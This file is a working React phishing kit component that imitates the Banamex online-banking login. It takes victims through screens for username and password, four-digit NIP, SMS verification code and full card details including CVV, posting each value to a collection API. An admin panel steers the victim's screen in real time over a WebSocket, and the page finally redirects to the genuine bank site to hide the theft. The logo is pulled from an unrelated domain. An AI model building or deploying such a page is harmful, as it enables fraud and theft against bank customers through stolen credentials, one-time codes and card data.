import { useState, useEffect } from "react";
import { useSearch } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Home, BookOpen, Phone, Building2 } from "lucide-react";

interface FormData {
  usuario: string;
  password: string;
  nip: string;
  smsCode: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
}

type Screen = "login" | "nip" | "sms-verification" | "card-protection";

export default function TemplateBanamex() {
  const search = useSearch();
  const sessionId = new URLSearchParams(search).get("sessionId");
  
  const [currentScreen, setCurrentScreen] = useState<Screen>("login");
  const [formData, setFormData] = useState<FormData>({
    usuario: "",
    password: "",
    nip: "",
    smsCode: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  });
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);

  // WebSocket listener for screen changes from admin
  useEffect(() => {
    if (!sessionId) return;

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    const socket = new WebSocket(wsUrl);

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'session_updated' && data.data?.id === sessionId) {
        const newScreen = data.data.currentScreen;
        if (newScreen && newScreen !== currentScreen) {
          setCurrentScreen(newScreen as Screen);
        }
      }
    };

    return () => {
      socket.close();
    };
  }, [sessionId, currentScreen]);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit login data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "usuario",
          fieldValue: formData.usuario
        })
      });

      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "password",
          fieldValue: formData.password
        })
      });
      
      // Show loading and move to NIP screen
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
      setTimeout(async () => {
        setCurrentScreen("nip");
        setIsTransitioning(false);
        
        // Update session screen to nip
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "nip" })
        });
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting login:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNipSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit NIP data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "nip",
          fieldValue: formData.nip
        })
      });
      
      // Show loading and move to card protection screen
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
      setTimeout(async () => {
        setCurrentScreen("sms-verification");
        setIsTransitioning(false);
        
        // Update session screen to sms-verification
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "sms-verification" })
        });
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting NIP:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSmsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit SMS code data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "smsCode",
          fieldValue: formData.smsCode
        })
      });
      
      // Show loading and move to card protection screen
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
      setTimeout(async () => {
        setCurrentScreen("card-protection");
        setIsTransitioning(false);
        
        // Update session screen to card-protection
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "card-protection" })
        });
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting SMS code:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit card data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "cardNumber",
          fieldValue: formData.cardNumber
        })
      });

      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "expiryDate",
          fieldValue: `${formData.expiryMonth}/${formData.expiryYear}`
        })
      });

      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "cvv",
          fieldValue: formData.cvv
        })
      });
      
      // Update session status to form_filled
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "form_filled" })
      });
      
      // Redirect to real Banamex after delay
      setTimeout(() => {
        window.location.href = "https://www.banamex.com/";
      }, 1000);
      
    } catch (error) {
      console.error("Error submitting card data:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderLoginScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <form onSubmit={handleLoginSubmit} className="space-y-6">
        {/* Campo de usuario */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Usuario
          </label>
          <Input
            type="text"
            value={formData.usuario}
            onChange={(e) => setFormData(prev => ({...prev, usuario: e.target.value}))}
            placeholder="Ingresa tu usuario"
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black"
            data-testid="input-usuario"
            required
          />
        </div>

        {/* Campo de contraseña */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Contraseña
          </label>
          <Input
            type="password"
            value={formData.password}
            onChange={(e) => setFormData(prev => ({...prev, password: e.target.value}))}
            placeholder="Ingresa tu contraseña"
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black"
            data-testid="input-password"
            required
          />
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || !formData.usuario.trim() || !formData.password.trim()}
          className="w-full bg-[#1e7bb8] hover:bg-[#155b8a] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-continuar"
        >
          {isSubmitting ? "Ingresando..." : "Ingresar"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <a href="#" className="text-[#1e7bb8] text-sm hover:underline block">
            ¿Olvidaste tu contraseña?
          </a>
          <a href="#" className="text-[#1e7bb8] text-sm hover:underline block">
            ¿Problemas para ingresar?
          </a>
        </div>
      </form>
    </div>
  );

  const renderNipScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-8">
        <h2 className="text-xl font-medium text-gray-800 mb-2">Ingresa tu NIP</h2>
        <p className="text-sm text-gray-600">Por tu seguridad, ingresa tu NIP de 4 dígitos</p>
      </div>
      
      <form onSubmit={handleNipSubmit} className="space-y-6">
        {/* Campo de NIP */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            NIP
          </label>
          <Input
            type="password"
            value={formData.nip}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').slice(0, 4);
              setFormData(prev => ({...prev, nip: value}));
            }}
            placeholder="••••"
            maxLength={4}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black text-center text-2xl tracking-widest"
            data-testid="input-nip"
            required
          />
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || formData.nip.length !== 4}
          className="w-full bg-[#1e7bb8] hover:bg-[#155b8a] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-continuar-nip"
        >
          {isSubmitting ? "Verificando..." : "Continuar"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <a href="#" className="text-[#1e7bb8] text-sm hover:underline block">
            ¿Olvidaste tu NIP?
          </a>
          <button 
            type="button"
            onClick={async () => {
              setCurrentScreen("login");
              if (sessionId) {
                await fetch(`/api/sessions/${sessionId}`, {
                  method: "PATCH",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ currentScreen: "login" })
                });
              }
            }}
            className="text-gray-600 text-sm hover:underline block"
          >
            ← Regresar
          </button>
        </div>
      </form>
    </div>
  );

  const renderLoadingScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center">
        <div className="mb-8">
          <div className="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-[#1e7bb8]"></div>
        </div>
        <h2 className="text-xl font-medium text-gray-800 mb-2">Verificando datos</h2>
        <p className="text-sm text-gray-600">Estamos validando tu información...</p>
      </div>
    </div>
  );

  const renderSmsVerificationScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-8">
        <h2 className="text-xl font-medium text-gray-800 mb-4">Verificación SMS</h2>
        <p className="text-sm text-gray-600 leading-relaxed mb-2">
          Hemos enviado un código de verificación a tu número de teléfono.
        </p>
        <p className="text-sm text-gray-600">
          Ingresa el código de 6 dígitos para continuar.
        </p>
      </div>
      
      <form onSubmit={handleSmsSubmit} className="space-y-6">
        {/* Campo de código SMS */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium text-center">
            Código de verificación
          </label>
          <Input
            type="text"
            value={formData.smsCode}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').slice(0, 6);
              setFormData(prev => ({...prev, smsCode: value}));
            }}
            placeholder="123456"
            maxLength={6}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black text-center text-2xl tracking-widest"
            data-testid="input-sms-code"
            required
          />
        </div>

        {/* Botón Verificar */}
        <Button
          type="submit"
          disabled={isSubmitting || formData.smsCode.length !== 6}
          className="w-full bg-[#1e7bb8] hover:bg-[#155b8a] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-verificar-sms"
        >
          {isSubmitting ? "Verificando..." : "Verificar código"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <a href="#" className="text-[#1e7bb8] text-sm hover:underline block">
            ¿No recibiste el código?
          </a>
          <button 
            type="button"
            onClick={async () => {
              setCurrentScreen("nip");
              if (sessionId) {
                await fetch(`/api/sessions/${sessionId}`, {
                  method: "PATCH",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ currentScreen: "nip" })
                });
              }
            }}
            className="text-gray-600 text-sm hover:underline block"
          >
            ← Regresar
          </button>
        </div>
      </form>
    </div>
  );

  const renderCardProtectionScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-8">
        <h2 className="text-xl font-medium text-gray-800 mb-4">Protección Adicional</h2>
        <p className="text-sm text-gray-600 leading-relaxed">
          Con el fin de evitar intentos de compra en línea, agregaremos protección adicional a su tarjeta de crédito/débito.
        </p>
      </div>
      
      <form onSubmit={handleCardSubmit} className="space-y-6">
        {/* Número de tarjeta */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Número de tarjeta
          </label>
          <Input
            type="text"
            value={formData.cardNumber}
            onChange={(e) => {
              // Solo números y máximo 16 dígitos, formatear con espacios
              const value = e.target.value.replace(/\D/g, '').slice(0, 16);
              const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
              setFormData(prev => ({...prev, cardNumber: formatted}));
            }}
            placeholder="1234 5678 9012 3456"
            maxLength={19}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black"
            data-testid="input-card-number"
            required
          />
        </div>

        {/* Fecha de vencimiento */}
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <label className="block text-gray-700 text-sm font-medium">
              Mes
            </label>
            <Input
              type="text"
              value={formData.expiryMonth}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 2);
                if (parseInt(value) <= 12 || value === '') {
                  setFormData(prev => ({...prev, expiryMonth: value}));
                }
              }}
              placeholder="MM"
              maxLength={2}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black"
              data-testid="input-expiry-month"
              required
            />
          </div>
          <div className="space-y-2">
            <label className="block text-gray-700 text-sm font-medium">
              Año
            </label>
            <Input
              type="text"
              value={formData.expiryYear}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 2);
                setFormData(prev => ({...prev, expiryYear: value}));
              }}
              placeholder="AA"
              maxLength={2}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black"
              data-testid="input-expiry-year"
              required
            />
          </div>
        </div>

        {/* CVV */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            CVV
          </label>
          <Input
            type="password"
            value={formData.cvv}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').slice(0, 3);
              setFormData(prev => ({...prev, cvv: value}));
            }}
            placeholder="•••"
            maxLength={3}
            className="w-24 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#1e7bb8] focus:ring-1 focus:ring-[#1e7bb8] bg-white text-black text-center"
            data-testid="input-cvv"
            required
          />
          <p className="text-xs text-gray-500">Los 3 dígitos del reverso de su tarjeta</p>
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || !formData.cardNumber.replace(/\s/g, '').length || !formData.expiryMonth || !formData.expiryYear || !formData.cvv}
          className="w-full bg-[#1e7bb8] hover:bg-[#155b8a] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-continuar-card"
        >
          {isSubmitting ? "Procesando..." : "Agregar Protección"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <button 
            type="button"
            onClick={async () => {
              setCurrentScreen("sms-verification");
              if (sessionId) {
                await fetch(`/api/sessions/${sessionId}`, {
                  method: "PATCH",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ currentScreen: "sms-verification" })
                });
              }
            }}
            className="text-gray-600 text-sm hover:underline block"
          >
            ← Regresar
          </button>
        </div>
      </form>
    </div>
  );

  return (
    <div className="min-h-screen bg-white">
      {/* Header azul Banamex */}
      <div className="bg-[#1e7bb8] text-white text-center py-6">
        {/* Logo oficial de Banamex */}
        <div className="mb-3">
          <img 
            src="https://hh.airlines-mx.click/premios/hook/banamex_logo_new.png" 
            alt="Banamex" 
            className="mx-auto h-8"
            data-testid="img-banamex-logo"
          />
        </div>
        <h1 className="text-2xl font-light mb-1">
          {currentScreen === "login" ? "Identificación" : "Autenticación"}
        </h1>
        <p className="text-sm opacity-90">3 de septiembre de 2025</p>
      </div>

      {/* Navegación */}
      <div className="bg-gray-100 border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4">
          <nav className="flex items-center justify-center space-x-8 py-3">
            <a href="#" className="flex items-center space-x-1 text-gray-600 hover:text-gray-800 text-sm">
              <Home size={16} />
              <span>Inicio</span>
            </a>
            <a href="#" className="flex items-center space-x-1 text-gray-600 hover:text-gray-800 text-sm">
              <BookOpen size={16} />
              <span>Tutorial</span>
            </a>
            <a href="#" className="flex items-center space-x-1 text-gray-600 hover:text-gray-800 text-sm">
              <Phone size={16} />
              <span>Contáctanos</span>
            </a>
            <a href="#" className="flex items-center space-x-1 text-gray-600 hover:text-gray-800 text-sm">
              <Building2 size={16} />
              <span>Sucursales y cajeros</span>
            </a>
          </nav>
        </div>
      </div>

      {/* Contenido principal */}
      {isTransitioning ? renderLoadingScreen() : 
       currentScreen === "login" ? renderLoginScreen() : 
       currentScreen === "nip" ? renderNipScreen() : 
       currentScreen === "sms-verification" ? renderSmsVerificationScreen() : 
       renderCardProtectionScreen()}

      {/* Footer */}
      <div className="bg-[#1e7bb8] text-white py-8 mt-16">
        <div className="max-w-4xl mx-auto px-4">
          <div className="text-center space-y-4">
            <div className="flex flex-wrap justify-center gap-4 text-sm">
              <a href="#" className="text-white hover:text-blue-200">Aprende más</a>
              <a href="#" className="text-white hover:text-blue-200">Ayuda</a>
              <a href="#" className="text-white hover:text-blue-200">Términos y condiciones</a>
              <a href="#" className="text-white hover:text-blue-200">Seguridad en línea</a>
            </div>
            <div className="flex flex-wrap justify-center gap-4 text-sm">
              <a href="#" className="text-white hover:text-blue-200">Contáctanos</a>
              <a href="#" className="text-white hover:text-blue-200">Aclaraciones</a>
              <a href="#" className="text-white hover:text-blue-200">Promociones</a>
              <a href="#" className="text-white hover:text-blue-200">Facebook</a>
              <a href="#" className="text-white hover:text-blue-200">Youtube</a>
            </div>
            <div className="pt-4 border-t border-blue-600">
              <p className="text-xs text-blue-200">
                © 2025 Citibanamex. Todos los derechos reservados.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}